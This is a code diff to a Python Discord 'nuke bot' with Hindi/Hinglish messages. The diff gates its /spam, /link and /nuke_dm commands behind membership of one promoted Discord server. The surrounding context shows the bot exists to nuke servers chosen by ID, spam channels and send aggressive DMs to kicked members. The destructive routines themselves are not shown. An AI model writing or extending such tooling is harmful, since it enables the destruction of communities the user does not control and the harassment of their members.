@@ -17,6 +17,7 @@ intents.dm_messages = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
+ALLOWED_GUILD_ID = 1322848585702838302  # https://discord.gg/4Gm7kuTh server ID
 
 @bot.event
 async def on_ready():
@@ -38,8 +39,13 @@ async def on_guild_join(guild):
             if channel.permissions_for(guild.me).send_messages:
                 embed = discord.Embed(
                     title="🔥 NUKE BOT ACTIVE 🔥",
-                    description="Bot successfully added!\n\n**अब DM में commands use करो!**",
+                    description="Bot successfully added!\n\n**⚠️ इस bot को use करने के लिए पहले join करो:**\n👇👇👇",
                     color=discord.Color.red()
+                )
+                embed.add_field(
+                    name="🔗 Join करो:",
+                    value="[Click Here to Join]( https://discord.gg/4Gm7kuTh)",
+                    inline=False
                 )
                 embed.add_field(
                     name="📖 Commands:",
@@ -48,13 +54,30 @@ async def on_guild_join(guild):
                 )
                 embed.add_field(
                     name="🔥 Usage:",
-                    value="DM में यह commands भेजो!",
+                    value="Join करने के बाद DM में यह commands भेजो!",
                     inline=False
                 )
                 await channel.send(embed=embed)
                 break
     except Exception as e:
         print(f"⚠️ Could not send join message: {e}")
+
+# Check if user is member of allowed guild
+async def is_allowed_member(user_id: int) -> bool:
+    """Check if user is member of allowed guild"""
+    try:
+        guild = bot.get_guild(ALLOWED_GUILD_ID)
+        if guild is None:
+            print(f"⚠️ Allowed guild not found: {ALLOWED_GUILD_ID}")
+            return False
+        
+        member = guild.get_member(user_id)
+        if member is not None:
+            return True
+        return False
+    except Exception as e:
+        print(f"⚠️ Error checking membership: {e}")
+        return False
 
 # Aggressive DM messages for kicked members
 DM_MESSAGES = [
@@ -198,6 +221,35 @@ SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━�
 )
 async def spam(interaction: discord.Interaction, count: int, message: str = None):
     """Channel mein custom message ko spam karo"""
+    
+    # Check if user is allowed
+    is_allowed = await is_allowed_member(interaction.user.id)
+    if not is_allowed:
+        embed = discord.Embed(
+            title="❌ ACCESS DENIED!",
+            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            color=discord.Color.red()
+        )
+        embed.add_field(
+            name="🔗 Join Server:",
+            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            inline=False
+        )
+        embed.add_field(
+            name="⏳ Process:",
+            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            inline=False
+        )
+        
+        try:
+            await interaction.user.send(embed=embed)
+            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
+        except:
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        print(f"❌ Unauthorized user {interaction.user.name} tried to use /spam")
+        return
+    
     await interaction.response.defer()
     
     # Validate count
@@ -271,6 +323,35 @@ async def spam(interaction: discord.Interaction, count: int, message: str = None
 @discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID")
 async def link(interaction: discord.Interaction, server_id: str):
     """Server ID se Magic Link generate karo"""
+    
+    # Check if user is allowed
+    is_allowed = await is_allowed_member(interaction.user.id)
+    if not is_allowed:
+        embed = discord.Embed(
+            title="❌ ACCESS DENIED!",
+            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            color=discord.Color.red()
+        )
+        embed.add_field(
+            name="🔗 Join Server:",
+            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            inline=False
+        )
+        embed.add_field(
+            name="⏳ Process:",
+            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            inline=False
+        )
+        
+        try:
+            await interaction.user.send(embed=embed)
+            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
+        except:
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        print(f"❌ Unauthorized user {interaction.user.name} tried to use /link")
+        return
+    
     await interaction.response.defer(ephemeral=True)
     
     try:
@@ -327,6 +408,35 @@ async def link(interaction: discord.Interaction, server_id: str):
 @discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID दो")
 async def nuke_dm(interaction: discord.Interaction, server_id: str):
     """DM se kisi bhi server ko nuke kar do!"""
+    
+    # Check if user is allowed
+    is_allowed = await is_allowed_member(interaction.user.id)
+    if not is_allowed:
+        embed = discord.Embed(
+            title="❌ ACCESS DENIED!",
+            description="**इस bot को use करने के लिए पहले server में join करो!**",
+            color=discord.Color.red()
+        )
+        embed.add_field(
+            name="🔗 Join Server:",
+            value="[Click Here - https://discord.gg/4Gm7kuTh](https://discord.gg/4Gm7kuTh)",
+            inline=False
+        )
+        embed.add_field(
+            name="⏳ Process:",
+            value="1️⃣ Link पर click करो\n2️⃣ Server join करो\n3️⃣ फिर से command दो",
+            inline=False
+        )
+        
+        try:
+            await interaction.user.send(embed=embed)
+            await interaction.response.send_message("❌ Access Denied! Check your DM for details!", ephemeral=True)
+        except:
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        print(f"❌ Unauthorized user {interaction.user.name} tried to use /nuke_dm")
+        return
+    
     await interaction.response.defer(ephemeral=True)
     
     try:
